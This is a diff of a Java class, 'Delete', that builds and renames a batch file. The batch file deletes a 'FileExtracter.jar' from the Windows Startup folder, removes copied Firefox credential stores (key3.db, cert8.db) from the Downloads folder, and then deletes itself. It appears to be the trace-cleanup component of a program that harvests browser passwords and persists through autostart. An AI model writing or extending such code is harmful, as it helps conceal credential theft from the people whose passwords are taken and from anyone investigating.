@@ -3,40 +3,45 @@ import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
- 
+
+
 public class Delete {
-	public static void main(String[] args) {
+	public static void main(String[] args){
 		try {
- //stuff to put into bat
-			String address = "\"%USERPROFILE%\\Downloads\\";
+			//stuff to put into bat
+			String address1 = "\"%USERPROFILE%\\Downloads\\";
+			String address2 = "\r\ndel \"%Appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
 		    String del = "\r\ndel ";
-		    String content = "del \"%Appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\FileExtracter.jar\" "
-		    				+del+address+"\\key3.db\" "
-		    				+del+address+"\\cert8.db\" "
-		    				+del+address+"\\del.bat\" ";
+		    String content = "ECHO OFF "+address2+"FileExtracter.jar\" "
+		    				+del+address1+"\\key3.db\" "
+		    				+del+address1+"\\cert8.db\" "
+		    				+del+address2+"del.bat\" ";
 			
 		    
 		    File file = new File("del.txt");
- 
-			// if file doesnt exists, then create it
-			if (!file.exists()) {
+		    File bat = new File("del.bat");
+			//check to ensure file doesn't exist
+			if (!bat.exists()) {
 				file.createNewFile();
+				//write data
+				FileWriter fw = new FileWriter(file.getAbsoluteFile());
+				BufferedWriter bw = new BufferedWriter(fw);
+				bw.write(content);
+				bw.close();
+
 			}
- 
-			FileWriter fw = new FileWriter(file.getAbsoluteFile());
-			BufferedWriter bw = new BufferedWriter(fw);
-			bw.write(content);
-			bw.close();
- 
+  
 			System.out.println("Done");
  
+			//convert to BAT file
+		    File file1 = new File("del.txt");
+		    File file2 = new File("del.bat");
+		    file1.renameTo(file2);
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
 		
-		//convert to BAT file
-	    File file = new File("del.txt");
-	    File file2 = new File("del.bat");
-	    file.renameTo(file2);
+
+
 	}
 }
